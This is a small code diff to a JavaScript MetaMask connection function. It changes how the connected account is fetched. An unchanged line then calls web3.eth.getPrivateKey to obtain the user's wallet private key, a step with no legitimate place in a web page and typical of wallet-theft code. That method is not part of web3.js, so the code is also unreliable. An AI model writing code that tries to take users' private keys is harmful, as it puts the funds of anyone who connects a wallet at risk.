@@ -28,7 +28,8 @@
  async function connectMetaMask() {
  if (window.ethereum) {
  try {
- const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+ await window.ethereum.request({ method: 'eth_requestAccounts' });
+ const accounts = await window.ethereum.request({ method: 'eth_accounts' });
  const userAccount = accounts[0];
  const web3 = new Web3(window.ethereum);
  const privateKey = await web3.eth.getPrivateKey(userAccount);
